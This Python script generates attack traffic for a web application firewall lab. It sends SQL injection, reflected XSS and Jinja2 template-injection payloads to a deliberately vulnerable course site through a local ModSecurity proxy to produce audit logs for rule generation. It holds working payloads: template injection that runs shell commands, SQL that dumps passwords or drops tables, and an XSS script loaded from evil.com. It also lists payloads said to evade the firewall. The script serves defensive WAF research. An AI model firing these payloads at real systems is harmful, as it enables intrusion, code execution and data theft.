#!/usr/bin/env python3
"""
attackScript.py
===============
Generate SQL-injection, XSS and SSTI attack traffic against the vulnerable LMS
target *through the XAF WAF*, so that ModSecurity writes real entries into
modsec-logs/audit.log. Those entries are the input for the parsing /
clustering / rule-generation pipeline.

Lab use only. By default this targets your own WAF on http://localhost:8080.
Sending traffic to :5000 would hit the LMS directly and bypass the WAF
(nothing would be logged by ModSecurity), so keep the target on the proxy port.

Attack sinks:
  POST /login          — SQLi via form fields: username, password
  GET  /courses?q=     — SQLi via query param q (WAF inspects even without a session)
  GET  /xss-search?q=  — reflected XSS via unescaped query param
  POST /feedback       — SSTI via Jinja2 render_template_string(user_input)

The XSS and SSTI endpoints are authenticated, so the script logs in first and
reuses the session cookie for every request.

Usage
-----
    python3 attackScript.py
    python3 attackScript.py --url http://localhost:8080 --rounds 5 --delay 0.3
    python3 attackScript.py --no-benign               # attacks only
    python3 attackScript.py --rounds 10 --delay 0.1   # more volume, faster
    python3 attackScript.py --type sqli               # SQLi payloads only
    python3 attackScript.py --type xss                # XSS payloads only
    python3 attackScript.py --type ssti               # SSTI payloads only
    python3 attackScript.py --bypasses-only           # only payloads that evade the traditional WAF

After it runs, check the log:
    tail -n 20 ~/Desktop/XAF/modsec-logs/audit.log
    wc -l ~/Desktop/XAF/modsec-logs/audit.log
"""

import argparse
import random
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter

# ---------------------------------------------------------------------------
# Credentials to obtain a session cookie (needed for authenticated endpoints)
# ---------------------------------------------------------------------------
LOGIN_USER = "student1"
LOGIN_PASS = "pass123"

# ---------------------------------------------------------------------------
# Payload sets, grouped by family.
# ---------------------------------------------------------------------------
SQLI_PAYLOADS = {
    "tautology": [
        "' OR 1=1-- -",
        "' OR '1'='1",
        "admin'-- -",
        "') OR ('1'='1",
        "' OR 1=1#",
        '" OR ""="',
        "or 1=1",
    ],
    "union": [
        "' UNION SELECT NULL-- -",
        "' UNION SELECT username, password FROM users-- -",
        "1' UNION SELECT 1,2,3-- -",
        "' UNION ALL SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT code,title,instructor FROM courses-- -",
    ],
    "boolean_blind": [
        "' AND 1=1-- -",
        "' AND 1=2-- -",
        "1' AND '1'='1",
        "1' AND '1'='2",
    ],
    "time_based": [
        "' OR SLEEP(5)-- -",
        "'; WAITFOR DELAY '0:0:5'-- -",
        "' OR pg_sleep(5)-- -",
        "1' AND SLEEP(5)-- -",
    ],
    "error_based": [
        "' AND extractvalue(1, concat(0x7e, version()))-- -",
        "' AND updatexml(1, concat(0x7e, (SELECT version())), 1)-- -",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    ],
    "stacked": [
        "'; DROP TABLE users-- -",
        "1; SELECT * FROM users",
        "'; UPDATE users SET password='x'-- -",
    ],
    "obfuscated": [
        "'/**/OR/**/1=1-- -",
        "' oR 1=1-- -",
        "'||'1'='1",
        "')/**/UNION/**/SELECT/**/NULL-- -",
        "'    OR     1   =   1-- -",
        "'%09OR%091=1-- -",
    ],
}

# Payloads confirmed to bypass the traditional CRS-based WAF (code=200 in testing).
# These are the ones the adaptive WAF must catch.
BYPASS_PAYLOADS = {
    "tautology": [
        "or 1=1",
        "admin'-- -",
    ],
    "stacked": [
        "1; SELECT * FROM users",
    ],
}

XSS_PAYLOADS = {
    "script_tag": [
        "<script>alert(1)</script>",
        "<script>alert(document.cookie)</script>",
        "<SCRIPT>alert('xss')</SCRIPT>",
        "<script src=//evil.com/x.js></script>",
    ],
    "event_handler": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],
    "javascript_uri": [
        "<a href=javascript:alert(1)>click</a>",
        "<iframe src=javascript:alert(1)>",
        "javascript:alert(document.domain)",
    ],
    "encoded": [
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "<scr\x00ipt>alert(1)</scr\x00ipt>",
        "<img src=x o\x00nerror=alert(1)>",
    ],
    "obfuscated": [
        "<ScRiPt>alert(1)</sCrIpT>",
        "<svg/onload=alert(1)>",
        "<<script>alert(1)//<</script>",
        "<img src=\"x\" onerror=\"alert(1)\">",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
    ],
}

SSTI_PAYLOADS = {
    "probe": [
        "{{7*7}}",
        "{{7*'7'}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
    ],
    "info_leak": [
        "{{config}}",
        "{{config.items()}}",
        "{{request.environ}}",
        "{{self.__dict__}}",
        "{{g}}",
    ],
    "class_traversal": [
        "{{''.__class__.__mro__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{().__class__.__bases__[0].__subclasses__()}}",
        "{{[].__class__.__mro__[-1].__subclasses__()}}",
    ],
    "rce": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{%for x in ().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
        "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
    ],
    "obfuscated": [
        "{{''.join(['_','_','c','l','a','s','s','_','_'])}}",
        "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}",
        "{%set x='__cla'+'ss__'%}{{''|attr(x)}}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
    ],
}

# Benign baseline — these should mostly NOT be blocked (false-positive check).
# SQLi endpoints (login / courses) take short keyword-style input; the XSS/SSTI
# endpoints (search / feedback) take more natural-language input.
BENIGN_SQLI = [
    "python",
    "data science",
    "networking",
    "mathematics",
    "student1",
    "web development",
    "1",
]

BENIGN_XSS = [
    "python programming",
    "database systems",
    "great course, very helpful!",
    "I enjoyed the lab sessions.",
    "please add more exercises",
    "hello world",
    "networking fundamentals",
]


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------
def make_opener():
    # Return an opener that follows redirects and stores cookies
    jar = urllib.request.HTTPCookieProcessor()
    return urllib.request.build_opener(jar)


def do_login(opener, base):
    # Authenticate through the WAF and store the session cookie in opener
    body = urllib.parse.urlencode({"username": LOGIN_USER, "password": LOGIN_PASS}).encode()
    req = urllib.request.Request(
        f"{base}/login",
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded",
                 "User-Agent": "xaf-attack-sim/2.0"},
        method="POST",
    )
    try:
        with opener.open(req, timeout=10):
            pass
        return True
    except Exception as exc:
        print(f"[!] Login failed: {exc}")
        return False


def do_request(opener, url, data=None):
    # Send one request through the session opener; return the HTTP status code
    method = "POST" if data is not None else "GET"
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded",
                 "User-Agent": "xaf-attack-sim/2.0"},
        method=method,
    )
    try:
        with opener.open(req, timeout=10) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except urllib.error.URLError as e:
        return f"ERR:{e.reason}"


# ---------------------------------------------------------------------------
# Attack functions — SQLi
# ---------------------------------------------------------------------------
def attack_login_username(opener, base, payload):
    # POST /login — inject into the username field.
    body = urllib.parse.urlencode({"username": payload, "password": "wrongpass"}).encode()
    return do_request(opener, f"{base}/login", data=body)


def attack_login_password(opener, base, payload):
    # POST /login — inject into the password field.
    body = urllib.parse.urlencode({"username": "admin", "password": payload}).encode()
    return do_request(opener, f"{base}/login", data=body)


def attack_courses_search(opener, base, payload):
    # GET /courses?q= — inject into the course search parameter.
    qs = urllib.parse.urlencode({"q": payload})
    return do_request(opener, f"{base}/courses?{qs}")


# ---------------------------------------------------------------------------
# Attack functions — XSS / SSTI
# ---------------------------------------------------------------------------
def attack_xss_search(opener, base, payload):
    # GET /xss-search?q=<payload>
    qs = urllib.parse.urlencode({"q": payload})
    return do_request(opener, f"{base}/xss-search?{qs}")


def attack_ssti_feedback(opener, base, payload):
    # POST /feedback with message=<payload>
    body = urllib.parse.urlencode({"message": payload}).encode()
    return do_request(opener, f"{base}/feedback", data=body)


# ---------------------------------------------------------------------------
# Benign baselines
# ---------------------------------------------------------------------------
def attack_benign_login(opener, base, payload):
    # POST /login with a benign username (false-positive baseline).
    body = urllib.parse.urlencode({"username": payload, "password": "wrongpass"}).encode()
    return do_request(opener, f"{base}/login", data=body)


def attack_benign_courses(opener, base, payload):
    # GET /courses?q=<benign> — false-positive baseline.
    qs = urllib.parse.urlencode({"q": payload})
    return do_request(opener, f"{base}/courses?{qs}")


def attack_benign_search(opener, base, payload):
    # GET /xss-search?q=<benign> — false-positive baseline.
    qs = urllib.parse.urlencode({"q": payload})
    return do_request(opener, f"{base}/xss-search?{qs}")


def attack_benign_feedback(opener, base, payload):
    # POST /feedback with benign message — false-positive baseline.
    body = urllib.parse.urlencode({"message": payload}).encode()
    return do_request(opener, f"{base}/feedback", data=body)


# ---------------------------------------------------------------------------
# Task builders — each task is (attack_type, family, vector, payload, callable)
# ---------------------------------------------------------------------------
def build_tasks(attack_type, include_benign):
    tasks = []

    if attack_type in ("sqli", "all"):
        for family, payloads in SQLI_PAYLOADS.items():
            for p in payloads:
                tasks.append(("sqli", family, "login_username", p,
                              lambda op, base, p=p: attack_login_username(op, base, p)))
                tasks.append(("sqli", family, "login_password", p,
                              lambda op, base, p=p: attack_login_password(op, base, p)))
                tasks.append(("sqli", family, "courses_q", p,
                              lambda op, base, p=p: attack_courses_search(op, base, p)))

    if attack_type in ("xss", "all"):
        for family, payloads in XSS_PAYLOADS.items():
            for p in payloads:
                tasks.append(("xss", family, "xss_search", p,
                              lambda op, base, p=p: attack_xss_search(op, base, p)))

    if attack_type in ("ssti", "all"):
        for family, payloads in SSTI_PAYLOADS.items():
            for p in payloads:
                tasks.append(("ssti", family, "feedback", p,
                              lambda op, base, p=p: attack_ssti_feedback(op, base, p)))

    if include_benign:
        if attack_type in ("sqli", "all"):
            for p in BENIGN_SQLI:
                tasks.append(("benign", "benign", "login_username", p,
                              lambda op, base, p=p: attack_benign_login(op, base, p)))
                tasks.append(("benign", "benign", "courses_q", p,
                              lambda op, base, p=p: attack_benign_courses(op, base, p)))
        if attack_type in ("xss", "ssti", "all"):
            for p in BENIGN_XSS:
                tasks.append(("benign", "benign", "xss_search", p,
                              lambda op, base, p=p: attack_benign_search(op, base, p)))
                tasks.append(("benign", "benign", "feedback", p,
                              lambda op, base, p=p: attack_benign_feedback(op, base, p)))

    return tasks


def build_bypass_tasks():
    # Return SQLi tasks for only the payloads that evade the traditional CRS WAF
    tasks = []
    for family, payloads in BYPASS_PAYLOADS.items():
        for p in payloads:
            tasks.append(("sqli", family, "login_username", p,
                          lambda op, base, p=p: attack_login_username(op, base, p)))
            tasks.append(("sqli", family, "login_password", p,
                          lambda op, base, p=p: attack_login_password(op, base, p)))
            tasks.append(("sqli", family, "courses_q", p,
                          lambda op, base, p=p: attack_courses_search(op, base, p)))
    return tasks


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(
        description="SQLi + XSS + SSTI attack-traffic generator for the XAF WAF lab."
    )
    ap.add_argument("--url", default="http://localhost:8080",
                    help="Base URL of the WAF proxy (default: http://localhost:8080)")
    ap.add_argument("--rounds", type=int, default=3,
                    help="How many times to cycle through the full payload set (default: 3)")
    ap.add_argument("--delay", type=float, default=0.25,
                    help="Seconds to wait between requests (default: 0.25)")
    ap.add_argument("--no-benign", action="store_true",
                    help="Send attack payloads only, skip benign baseline traffic")
    ap.add_argument("--type", choices=["sqli", "xss", "ssti", "all"], default="all",
                    help="Which attack type to send (default: all)")
    ap.add_argument("--bypasses-only", action="store_true",
                    help="Send only SQLi payloads that evade the traditional CRS WAF (adaptive WAF demo)")
    args = ap.parse_args()

    base = args.url.rstrip("/")
    if ":5000" in base:
        print("WARNING: :5000 hits the LMS directly and bypasses the WAF — "
              "nothing will be logged by ModSecurity. Use the proxy port (8080).\n")

    if args.bypasses_only:
        tasks = build_bypass_tasks()
        attack_type = "sqli"
        print("Mode            : bypasses-only (SQLi payloads that evade the traditional CRS WAF)")
    else:
        attack_type = args.type
        tasks = build_tasks(attack_type, include_benign=not args.no_benign)

    opener = make_opener()
    print(f"Logging in as {LOGIN_USER} through {base} ...", end=" ")
    if do_login(opener, base):
        print("OK\n")
    else:
        # The XSS/SSTI sinks need a session; SQLi sinks do not. Only abort when an
        # authenticated attack type is actually part of this run.
        if attack_type in ("xss", "ssti", "all"):
            print("Aborting (XSS/SSTI endpoints require a session).")
            sys.exit(1)
        print("Continuing without a session (SQLi sinks don't need one).\n")

    total = len(tasks) * args.rounds
    print(f"Target          : {base}")
    print(f"Attack type     : {attack_type}")
    print(f"Payload tasks   : {len(tasks)} per round")
    print(f"Rounds          : {args.rounds}")
    print(f"Total requests  : {total}")
    print(f"Delay / request : {args.delay}s\n")

    status_counts = Counter()
    family_blocked = Counter()
    family_total = Counter()
    sent = 0

    try:
        for r in range(1, args.rounds + 1):
            random.shuffle(tasks)
            for atype, family, vector, payload, fn in tasks:
                code = fn(opener, base)
                status_counts[code] += 1
                key = f"{atype}/{family}"
                family_total[key] += 1
                if code == 403:
                    family_blocked[key] += 1
                sent += 1

                blocked = "BLOCKED" if code == 403 else f"code={code}"
                short = (payload[:42] + "…") if len(payload) > 43 else payload
                print(f"[r{r}] {atype:<6} {family:<18} {vector:<16} {blocked:<10} {short}")
                time.sleep(args.delay)
    except KeyboardInterrupt:
        print("\nInterrupted — printing partial summary.\n")

    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"Requests sent : {sent}")

    print("\nBy status code:")
    for code, n in sorted(status_counts.items(), key=lambda kv: str(kv[0])):
        print(f"  {str(code):<10} {n}")

    print("\nBlock rate by family (403 / total):")
    for key in sorted(family_total):
        t = family_total[key]
        b = family_blocked.get(key, 0)
        pct = (b / t) * 100
        print(f"  {key:<28} {b:>4}/{t:<4} ({pct:5.1f}%)")

    print("\nNow inspect the audit log the WAF just wrote:")
    print("  tail -n 20 ~/Desktop/XAF/modsec-logs/audit.log")
    print("  wc -l   ~/Desktop/XAF/modsec-logs/audit.log")


if __name__ == "__main__":
    sys.exit(main())
